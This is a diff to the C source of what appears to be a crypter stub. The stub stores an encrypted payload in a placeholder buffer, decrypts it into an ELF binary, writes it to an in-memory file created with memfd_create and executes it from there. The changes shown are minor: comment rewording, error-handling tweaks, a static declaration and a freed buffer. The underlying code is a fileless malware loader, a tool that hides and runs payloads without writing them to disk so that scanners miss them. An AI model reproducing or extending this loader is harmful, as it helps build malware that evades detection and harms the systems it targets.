@@ -10,11 +10,11 @@
 #define IN_MEMORY_FILE_NAME "myfile"
 #define EXECUTABLE_NAME "stub_test"
 
-// Used to allocate space in the ELF .data section, so it needs to be initialized
-// This buffer will be replaced by the crypter with the encrypted payload
+// Used to allocate space in the ELF .data section, so we need to initialize it.
+// This buffer will be replaced with the encrypted payload by the crypter
 uint8_t buf[CRYPTER_MAX_PAYLOAD_SIZE] = { 'A', 'B', 'C', 'D', 'E', 'F' };
 
-uint8_t *read_payload(size_t *payload_size);
+static uint8_t *read_payload(size_t *payload_size);
 
 int main(void)
 {
@@ -22,7 +22,7 @@ int main(void)
 	// using preprocessor macros
 	int memfd = memfd_create(IN_MEMORY_FILE_NAME, MFD_CLOEXEC);
 	if (memfd == -1) {
-		fprintf(stderr, "memfd_create failed\n");
+		perror("memfd_create");
 		return -1;
 	}
 
@@ -30,23 +30,22 @@ int main(void)
 	size_t payload_size;
 	uint8_t *payload = read_payload(&payload_size);
 	if (!payload) {
-		fprintf(stderr, "Failed to read the payload\n");
 		return -1;
 	}
 
 	printf("Read encrypted payload of size: %ld\n", payload_size);
 
-	// Decrypt the payload to get the ELF file
+	// Decrypt the payload to get the original ELF file
 	size_t elf_size;
 	uint8_t *elf_file = decrypt(payload, payload_size, g_encryption_key, sizeof(g_encryption_key), &elf_size);
 	if (!elf_file) {
-		fprintf(stderr, "Failed to decrypt payload in memory\n");
+		fprintf(stderr, "Failed to decrypt the payload\n");
 		return -1;
 	}
 
 	// Check if the payload is a valid ELF
 	if (!is_elf(elf_file, elf_size)) {
-		fprintf(stderr, "Invalid ELF\n");
+		fprintf(stderr, "The payload is not a valid ELF\n");
 		return -1;
 	}
 
@@ -54,6 +53,7 @@ int main(void)
 
 	// Write ELF to the FD opened in memory
 	write(memfd, elf_file, elf_size);
+	free(elf_file);
 
 	// Execute the in-memory file
 	char memfd_path[64];
